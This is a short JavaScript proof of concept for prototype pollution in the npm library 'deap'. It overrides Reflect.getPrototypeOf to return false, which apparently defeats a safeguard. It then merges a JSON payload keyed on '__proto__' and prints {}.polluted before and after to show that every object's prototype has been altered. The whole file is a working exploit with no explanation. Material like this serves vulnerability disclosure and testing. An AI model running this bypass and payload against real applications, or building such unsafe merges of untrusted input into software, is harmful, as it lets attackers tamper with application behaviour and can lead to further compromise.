Reflect.getPrototypeOf = () => false;
const deap = require('deap');
obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
deap.merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);